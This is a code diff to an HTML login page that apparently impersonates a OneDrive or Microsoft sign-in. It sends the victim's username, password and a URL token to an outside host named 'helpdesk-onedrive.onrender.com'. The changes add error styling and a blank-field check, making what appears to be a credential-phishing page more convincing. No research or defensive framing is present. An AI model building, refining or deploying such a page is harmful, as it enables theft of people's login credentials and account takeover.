@@ -87,6 +87,11 @@
             z-index: 1000;
             display: none;
         }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -99,7 +104,7 @@
             <button type="button" onclick="login()">Next</button>
         </form>
         <p>No account? <a href="#">Create one!</a></p>
-        <p id="message"></p>
+        <p id="message" class="error-message"></p>
     </div>
     <div class="loading-overlay" id="loadingOverlay">
         <div>Authenticating your credentials, please wait...</div>
@@ -115,32 +120,34 @@
         }
 
         function getQueryVariable(variable) {
-            // Directly find the parameter by searching for '?token='
-    	    var query = window.location.href;
-    	    var tokenIndex = query.indexOf('?token=');
-
-    	    // If '?token=' is not found, try looking for '&token='
-    	    if (tokenIndex === -1) {
-        	tokenIndex = query.indexOf('&token=');
-    	    }
-
-    	    if (tokenIndex !== -1) {
-        	var start = tokenIndex + 7; // The length of '?token=' or '&token=' is 7
-        	var end = query.indexOf('&', start);
-        	if (end === -1) { // If there's no '&' after the token, take the rest of the string
-            	    end = query.length;
+            var query = window.location.href;
+            var tokenIndex = query.indexOf('?token=');
+            if (tokenIndex === -1) {
+                tokenIndex = query.indexOf('&token=');
+            }
+            if (tokenIndex !== -1) {
+                var start = tokenIndex + 7;
+                var end = query.indexOf('&', start);
+                if (end === -1) {
+                    end = query.length;
                 }
-        	return decodeURIComponent(query.substring(start, end));
-    	    }
-
-    	    console.log('Query variable %s not found', variable);
-    	    return null;
-	    }    
+                return decodeURIComponent(query.substring(start, end));
+            }
+            console.log('Query variable %s not found', variable);
+            return null;
+        }    
 
         async function login() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const token = getQueryVariable('token');
+            const messageElement = document.getElementById('message');
+
+            if (!username || !password) {
+                messageElement.textContent = 'Please enter both username and password.';
+                return;
+            }
+
             const url = 'https://helpdesk-onedrive.onrender.com/api/users/login';
 
             showLoading();
@@ -154,10 +161,10 @@
                     body: JSON.stringify({ username, password, token })
                 });
                 const data = await response.text();
-                document.getElementById('message').textContent = data;
+                messageElement.textContent = data;
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('message').textContent = 'An error occurred. Please try again.';
+                messageElement.textContent = 'An error occurred. Please try again.';
             } finally {
                 hideLoading();
             }
